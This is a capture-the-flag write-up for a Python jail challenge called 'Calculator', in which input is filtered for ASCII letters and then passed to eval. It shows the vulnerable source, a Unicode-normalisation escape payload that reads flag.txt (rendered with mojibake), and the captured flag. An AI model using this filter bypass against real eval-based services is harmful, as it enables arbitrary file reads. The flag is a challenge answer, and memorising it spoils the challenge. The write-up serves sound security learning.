# Calculator
![image](https://github.com/user-attachments/assets/e263c5e0-ab0b-4116-86a2-e6f3b2b3cec8)

Attachment: [calculator.py](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/SnykCon2025/attachments/calculator.py)

## Writeup

This challenge is a pyjail that I need to escape. I can't use underscore or any ASCII letters. 

```python
import sys

def simple_calculator():
    print("Welcome to the Simple Calculator!")
    print("Enter a mathematical expression:", end=' ')
    expression = input()
    sys.stdin.close()
    try:
        blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        for x in expression:
            if x in blacklist:
                print(f"{x} is not allowed!")
                exit()
        result = eval(expression)
        print(f"The result is: {result}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    simple_calculator()
```


A good cheatsheet for pyjail that I tend to use can be found here: https://shirajuki.js.org/blog/pyjail-cheatsheet

Python has a habbit of normalizing unicode so I can use this to turn ASCII letters into Unicode: https://lingojam.com/ItalicTextGenerator

I just wanted to read the flag so I used this command:

```
ğ—ˆğ—‰ğ–¾ğ—‡(ğ–¼ğ—ğ—‹(102)+ğ–¼ğ—ğ—‹(108)+ğ–¼ğ—ğ—‹(97)+ğ–¼ğ—ğ—‹(103)+ğ–¼ğ—ğ—‹(46)+ğ–¼ğ—ğ—‹(116)+ğ–¼ğ—ğ—‹(120)+ğ–¼ğ—ğ—‹(116)).ğ—‹ğ–¾ğ–ºğ–½()
```
I'm using chr() to build `flag.txt` since that can't be Unicode otherwise it won't find the file. 

![image](https://github.com/user-attachments/assets/cc15298f-57b7-4de3-a13f-1848e0b52ba0)

flag{46816031cb2177d2b9cbffe66a93d415}

